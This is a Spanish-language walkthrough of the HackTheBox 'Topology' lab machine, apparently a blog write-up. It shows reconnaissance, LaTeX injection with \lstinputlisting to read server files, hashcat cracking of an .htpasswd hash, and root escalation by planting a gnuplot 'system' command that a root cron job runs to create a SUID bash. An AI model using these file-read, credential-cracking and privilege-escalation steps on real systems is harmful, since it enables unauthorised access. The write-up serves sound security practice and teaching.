@@ -1,0 +1,245 @@
+---
+title: 'Máquina Topology'
+description: 'Resolución de la máquina Topology de HackTheBox'
+tags: ['LaTeX', 'Arbitrary File Read', 'gnuplot']
+categories: ['HackTheBox', 'Easy', 'Linux']
+logo: ' /assets/writeups/topology/logo.png'
+---
+
+El apartado web de una universidad para representar fórmulas matématicas y de cálculo es abusable mediante la inyección de expresiones LaTeX no deseadas, viendo los archivos del servidor encontraremos un `.htpasswd` con la contraseña de un usuario del sistema. Escalaremos privilegios abusando de una tarea cron que ejecuta archivos de gnuplot cada ciertos minutos.
+
+## Reconocimiento
+
+La máquina solo tiene 2 puertos abiertos
+
+```bash
+# Nmap 7.94 scan initiated Fri Nov  3 13:16:42 2023 as: nmap -sS -Pn -n -vvv -p- --open -oN ports --min-rate 200 10.10.11.217
+Nmap scan report for 10.10.11.217
+Host is up, received user-set (0.28s latency).
+Scanned at 2023-11-03 13:16:42 -04 for 141s
+Not shown: 61665 closed tcp ports (reset), 3868 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Fri Nov  3 13:19:03 2023 -- 1 IP address (1 host up) scanned in 140.88 seconds
+```
+
+El sitio web principal es de la universidad "Miskatonic", hecho por el departamento de matemáticas
+
+![Website](/assets/writeups/topology/1.png)
+
+Se nos muestra los temas de investigación actuales del grupo de topología, y una lista de proyectos de software en la segunda sección de la página:
+
+- LaTeX Equation Generator: Para crear PNGs de ecuaciones con LaTeX
+
+- PHPMyRefDB: Aplicación con soporte a BibTeX para manejar las citas en revistas (No disponible por ahora)
+
+- TopoMisk: Suite de topología hecho por L. Klein y V. Daisley. Se debe pedir al departamento.
+
+- PlotoTopo: Una colección de scripts de gnuplot para ayudar en la solución de problemas topológicos. Se debe pedir al departamento.
+
+El primero parece ser interesante, y es el único que manda a un enlace; http://latex.topology.htb/equation.php. Vamos a agregar el host a nuestro archivo de hosts
+
+```bash
+# Static table lookup for hostnames.
+# See hosts(5) for details.
+127.0.0.1 pwnedz0n
+
+10.10.11.217 latex.topology.htb
+```
+{: file='/etc/hosts' }
+
+Ahora podemos ver un sitio web que nos permite representar formulas algebraícas y de cálculo en PNGs
+
+![LaTeX](/assets/writeups/topology/2.png)
+
+Nos dice que introduzcamos una expresión en el modo matemático de LaTeX en una sola línea... vamos a ver que pasa si le ponemos otras expresiones
+
+## Intrusión
+
+### vdaisley - topology
+
+El sitio web parece tener ciertas protecciones ante intentos de abuso del LaTeX, por lo que veamos si podemos obtener alguna pista que podamos utilizar.
+
+![No](/assets/writeups/topology/3.png)
+
+Si intentamos acceder a la raíz del servidor web, se nos mostrará un listado de archivos
+
+![Dir Listing](/assets/writeups/topology/4.png)
+
+`header.tex` parece ser la cabecera que se utiliza para crear el PNG, contiene lo siguiente:
+
+```tex
+% vdaisley's default latex header for beautiful documents
+\usepackage[utf8]{inputenc} % set input encoding
+\usepackage{graphicx} % for graphic files
+\usepackage{eurosym} % euro currency symbol
+\usepackage{times} % set nice font, tex default font is not my style
+\usepackage{listings} % include source code files or print inline code
+\usepackage{hyperref} % for clickable links in pdfs
+\usepackage{mathtools,amssymb,amsthm} % more default math packages
+\usepackage{mathptmx} % math mode with times font
+```
+
+Si buscamos por instrucciones de las que podamos abusar en estos paquetes, encontramos una interesante en `listings`:
+
+> \lstinputlisting[(key=value list)]{filename}
+>
+>   typesets the stand alone source code as a displayed listing.
+
+Nos pide de paramétro obligatorio un nombre de archivo, se puede intuir que intentará cargar un archivo para mostrarlo asi que podemos intentar colarlo; al hacerlo, el servidor nos devuelve el `/etc/passwd`
+
+![passwd](/assets/writeups/topology/5.png)
+
+> Utilizando la misma instrucción, puedes darle algo de sintaxis a la salida.
+{: .prompt-info }
+
+Podemos ver que solamente `vdaisley` tiene una bash de shell, por lo que probablemente es el único usuario del sistema. Fuera de eso debemos echarle un ojo a la configuración del servidor web Apache, es una imagen larga pero haciendo zoom podemos leer y percatarnos de cosas interesantes
+
+![Apache](/assets/writeups/topology/6.png)
+
+Hay otros dos subdominios: stats.topology.htb y dev.topology.htb, y en uno de ellos se piden credenciales para acceder
+
+![Prompt](/assets/writeups/topology/7.png)
+
+En el archivos de configuración de Apache podemos ver el directorio que se usa para cada virtual host, sabiendo que está pidiendo credenciales podemos mirar si en la carpeta de este subdominio hay un archivo `.htpasswd`. Y...
+
+![htpasswd](/assets/writeups/topology/8.png)
+
+Estamos de suerte, y la contraseña tampoco es robusta.
+
+```bash
+$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0:calculus20          
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
+Hash.Target......: $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
+Time.Started.....: Fri Nov  3 14:13:38 2023 (1 min, 25 secs)
+Time.Estimated...: Fri Nov  3 14:15:03 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    11923 H/s (10.52ms) @ Accel:256 Loops:125 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 997376/14344384 (6.95%)
+Rejected.........: 0/997376 (0.00%)
+Restore.Point....: 996352/14344384 (6.95%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:875-1000
+Candidate.Engine.: Device Generator
+Candidates.#1....: canadacanada -> cajun123
+Hardware.Mon.#1..: Temp: 90c Util: 95%
+```
+
+Estas credenciales son válidas para la usuaria `vdaisley`, y en su directorio personal podremos tomar la primera flag
+
+```bash
+❯ /usr/bin/ssh vdaisley@10.10.11.217
+vdaisley@10.10.11.217s password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-150-generic x86_64)
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Fri Nov  3 14:16:20 2023 from 10.10.14.182
+vdaisley@topology:~$ ls -la
+total 32
+drwxr-xr-x 4 vdaisley vdaisley 4096 Nov  3 14:16 .
+drwxr-xr-x 3 root     root     4096 May 19 13:04 ..
+lrwxrwxrwx 1 root     root        9 Mar 13  2022 .bash_history -> /dev/null
+-rw-r--r-- 1 vdaisley vdaisley  220 Jan 17  2023 .bash_logout
+-rw-r--r-- 1 vdaisley vdaisley 3771 Jan 17  2023 .bashrc
+drwx------ 2 vdaisley vdaisley 4096 May 19 13:04 .cache
+drwx------ 3 vdaisley vdaisley 4096 May 19 13:04 .config
+-rw-r--r-- 1 vdaisley vdaisley  807 Jan 17  2023 .profile
+-rw-r----- 1 root     vdaisley   33 Nov  3 11:36 user.txt
+vdaisley@topology:~$ cat user.txt
+31d94075f4dba301c835e719be******
+```
+
+## Escalada de privilegios
+
+Hay una tarea que está ejecutando archivos de gnuplot en el directorio `/opt/gnuplot` como root
+
+```bash
+... [snip]
+2023/11/03 14:23:01 CMD: UID=0     PID=6702   | gnuplot /opt/gnuplot/loadplot.plt 
+2023/11/03 14:23:01 CMD: UID=0     PID=6701   | sed s/,//g 
+2023/11/03 14:23:01 CMD: UID=0     PID=6700   | cut -d  -f 3 
+2023/11/03 14:23:01 CMD: UID=0     PID=6699   | grep -o load average:.*$ 
+2023/11/03 14:23:01 CMD: UID=0     PID=6698   | uptime 
+2023/11/03 14:23:01 CMD: UID=0     PID=6691   | /bin/sh /opt/gnuplot/getdata.sh 
+2023/11/03 14:23:01 CMD: UID=0     PID=6689   | /bin/sh -c /opt/gnuplot/getdata.sh 
+2023/11/03 14:23:01 CMD: UID=0     PID=6688   | find /opt/gnuplot -name *.plt -exec gnuplot {} ; 
+2023/11/03 14:23:01 CMD: UID=0     PID=6687   | /bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \; 
+2023/11/03 14:23:01 CMD: UID=0     PID=6686   | /usr/sbin/CRON -f 
+2023/11/03 14:23:01 CMD: UID=0     PID=6685   | /usr/sbin/CRON -f 
+... [snip]
+```
+
+Estos archivos sirven para generar gráficas según los parámetros e instrucciones que le introduzca, parecido a `matplotlib` solo que sin la parte de programación. Buscando por instrucciones de las que podamos abusar de este programa encontramos:
+
+> system "command string"
+>
+> system "command" executes "command" in a subprocess by invoking the operating system's default shell. If called as a function, system("command") returns the character stream from the subprocess's stdout as a string. One trailing newline is stripped from the resulting string if present. See also backquotes.
+
+Siendo así esta instrucción, con solamente crear un archivo plt con lo siguiente
+
+```bash
+system "echo 1 > /tmp/uwuowo"
+```
+
+Ya podemos ejecutar comandos con total privilegio
+
+```bash
+vdaisley@topology:/tmp$ cd /opt/gnuplot/
+vdaisley@topology:/opt/gnuplot$ echo 'system "echo 1 > /tmp/asd"' > uwu.plt 
+... [wait for it]
+vdaisley@topology:/opt/gnuplot$ ls -la /tmp
+total 3088
+drwxrwxrwt 13 root     root        4096 Nov  3 14:29 .
+drwxr-xr-x 18 root     root        4096 Jun 12 10:37 ..
+-rw-r--r--  1 root     root           2 Nov  3 14:29 asd <-------
+drwxrwxrwt  2 root     root        4096 Nov  3 11:35 .font-unix
+drwxrwxrwt  2 root     root        4096 Nov  3 11:35 .ICE-unix
+-rwxrwxr-x  1 vdaisley vdaisley 3104768 Sep 15 21:25 pspy64
+drwx------  3 root     root        4096 Nov  3 11:35 systemd-private-8852126f0a5c451abf74265aff631f83-apache2.service-Pbxqpf
+drwx------  3 root     root        4096 Nov  3 11:35 systemd-private-8852126f0a5c451abf74265aff631f83-ModemManager.service-Ef2B8g
+drwx------  3 root     root        4096 Nov  3 11:35 systemd-private-8852126f0a5c451abf74265aff631f83-systemd-logind.service-ddU6Ig
+drwx------  3 root     root        4096 Nov  3 11:35 systemd-private-8852126f0a5c451abf74265aff631f83-systemd-resolved.service-0fqgUi
+drwx------  3 root     root        4096 Nov  3 11:35 systemd-private-8852126f0a5c451abf74265aff631f83-systemd-timesyncd.service-HRtyGf
+drwxrwxrwt  2 root     root        4096 Nov  3 11:35 .Test-unix
+drwx------  2 root     root        4096 Nov  3 11:36 vmware-root_678-2722697728
+drwxrwxrwt  2 root     root        4096 Nov  3 11:35 .X11-unix
+drwxrwxrwt  2 root     root        4096 Nov  3 11:35 .XIM-unix
+```
+
+Simplemente creando una copia SUID de la bash, ya nos permitirá tomar la última flag.
+
+```bash
+vdaisley@topology:/opt/gnuplot$ cat uwu.plt
+system "cp /bin/bash /tmp/uwu && chmod u+s /tmp/uwu"
+... [wait for it]
+vdaisley@topology:/opt/gnuplot$ ls -la /tmp/uwu
+-rwsr-xr-x 1 root root 1183448 Nov  3 14:32 /tmp/uwu
+vdaisley@topology:/opt/gnuplot$ /tmp/uwu -p
+uwu-5.0# cd /root
+uwu-5.0# ls
+root.txt
+uwu-5.0# cat root.txt
+ebfef51d26fd85d5a65782de9c******
+```
